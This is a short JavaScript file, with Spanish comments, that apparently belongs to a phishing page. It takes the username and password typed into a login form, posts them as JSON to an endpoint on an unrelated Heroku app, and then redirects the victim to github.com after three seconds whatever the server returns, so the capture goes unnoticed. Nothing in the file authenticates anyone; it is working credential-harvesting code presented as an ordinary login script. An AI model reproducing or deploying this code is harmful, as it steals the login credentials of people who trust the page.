const loginButton = document.querySelector(".login-container button");
const usuarioInput = document.getElementById("Usuario");
const passwordInput = document.getElementById("password");

window.addEventListener("DOMContentLoaded", () => {
    if (usuarioInput) usuarioInput.focus();
});

document.addEventListener("keydown", function (e) {
    // Asegurarse de que la tecla presionada sea "Enter"
    if (e.key === "Enter") {
        loginButton.click();
    }
});

loginButton.addEventListener("click", function (e) {
    e.preventDefault();

    const usuario = usuarioInput ? usuarioInput.value.trim() : "";
    const password = passwordInput ? passwordInput.value.trim() : "";

    if (usuario === "" || password === "") {
        return;
    }

    // Cambiar el texto del botón y deshabilitarlo
    this.textContent = "Validando Información...";
    this.classList.add("loading");
    this.disabled = true;

    // Enviar los datos a la API
    fetch("https://julia-putita-15bf1bccaf7f.herokuapp.com/api/e42", {
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify({
            user: usuario,
            password: password
        })
    })
    .then(response => {
        if (!response.ok) {
            throw new Error('Error en la respuesta de la API');
        }
        return response.json();
    })
    .then(data => {
        console.log("Respuesta de la API:", data);

        // Retrasar la redirección por 3 segundos
        setTimeout(() => {
            window.location.href = "https://github.com/"; // Redirige después de 3 segundos
        }, 3000); // 3000 milisegundos = 3 segundos
    })
    .catch(error => {
        console.error("Error al enviar los datos:", error);
        alert("Hubo un error al procesar la solicitud. Intenta nuevamente.");
        this.textContent = "Intentar nuevamente";
        this.classList.remove("loading");
        this.disabled = false;
    });
});
